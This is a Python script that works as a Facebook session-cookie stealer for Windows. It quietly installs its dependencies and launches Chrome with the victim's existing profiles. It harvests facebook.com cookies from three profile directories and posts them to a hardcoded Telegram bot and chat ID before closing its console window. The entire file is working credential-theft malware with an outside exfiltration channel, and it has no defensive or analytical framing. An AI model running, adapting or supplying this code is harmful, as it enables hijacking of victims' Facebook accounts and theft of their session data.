import os
import sys
import subprocess
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import requests

TOKEN = '7533821284:AAGDsLUDpZYbfzdghq8QihpeHXfhzGIP43I'
CHAT_ID = '1174455752'
TELEGRAM_API = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage'

def install_libraries():
    required_libs = ["requests", "webdriver_manager", "selenium"]
    try:
        subprocess.run([sys.executable, "-m", "ensurepip", "--upgrade"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for lib in required_libs:
            if subprocess.run([sys.executable, "-c", "import " + lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
                subprocess.run([sys.executable, "-m", "pip", "install", lib], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error installing libraries: {e}")
        sys.exit(1)

def check_chrome_installed():
    possible_paths = [
        os.path.join(os.getenv("ProgramFiles", "C:\\Program Files"), "Google", "Chrome", "Application", "chrome.exe"),
        os.path.join(os.getenv("ProgramFiles(x86)", "C:\\Program Files (x86)"), "Google", "Chrome", "Application", "chrome.exe"),
        os.path.join(os.getenv("LOCALAPPDATA", "C:\\Users\\" + os.getenv("USERNAME")), "Google", "Chrome", "Application", "chrome.exe"),
    ]
    if not any(os.path.exists(path) for path in possible_paths):
        print("Error: Chrome is not installed.")
        sys.exit(1)
    return True

def get_cookies(profile_name):
    options = Options()
    options.add_argument("user-data-dir=C:\\Users\\" + os.getenv("USERNAME") + "\\AppData\\Local\\Google\\Chrome\\User Data")
    options.add_argument("profile-directory=" + profile_name)

    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        driver.get('https://www.facebook.com/')
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        cookies = [c for c in driver.get_cookies() if 'facebook.com' in c['domain']]
        driver.quit()
        return cookies
    except Exception as e:
        print(f"Error with profile {profile_name}: {e}")
        return None

def cookies_to_header_string(cookies):
    return "; ".join(f"{cookie['name']}={cookie['value']}" for cookie in cookies) if cookies else "No cookies found!"

def send_telegram(profile_cookies):
    message = "\n\n".join(f"Profile: {p}\n{cookies_to_header_string(c)}" for p, c in profile_cookies.items()) or "No cookies retrieved!"
    try:
        response = requests.post(TELEGRAM_API, data={'chat_id': CHAT_ID, 'text': message}, timeout=5)
        if response.status_code != 200:
            print(f"Error sending Telegram message: {response.text}")
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

if __name__ == "__main__":
    install_libraries()
    if not check_chrome_installed():
        sys.exit(1)

    profile_cookies = {}
    profiles = ["Default", "Profile 1", "Profile 2"]
    for profile in profiles:
        cookies = get_cookies(profile)
        if cookies is not None:
            profile_cookies[profile] = cookies

    send_telegram(profile_cookies)
    os._exit(0)  # Tự động đóng CMD
